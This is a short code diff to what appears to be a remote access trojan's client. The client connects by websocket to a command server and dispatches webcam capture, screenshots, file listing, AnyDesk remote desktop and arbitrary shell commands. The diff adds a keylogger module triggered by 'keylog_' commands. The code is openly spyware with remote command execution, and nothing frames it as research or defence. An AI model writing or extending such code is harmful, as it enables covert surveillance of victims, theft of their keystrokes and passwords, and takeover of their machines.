@@ -56,6 +56,7 @@ from modules.webcam import capture_webcam
 from modules.screenshot import capture_screenshot
 from modules.file_browser import list_files
 from modules.remote_desktop import start_anydesk
+from modules.keylogger import handle as keylog_handle
 
 DEVICE_ID = get_device_id()
 WS_URL = f"{'wss' if USE_SSL else 'ws'}://{SERVER_URL}/ws/{DEVICE_ID}"
@@ -70,6 +71,8 @@ def execute(cmd, timeout=60):
         return start_anydesk()
     if c.startswith("ls "):
         return list_files(c[3:].strip())
+    if c.startswith("keylog_"):
+        return keylog_handle(cmd)
     try:
         r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
         out = r.stdout + ("\n[STDERR]\n" + r.stderr if r.stderr else "")
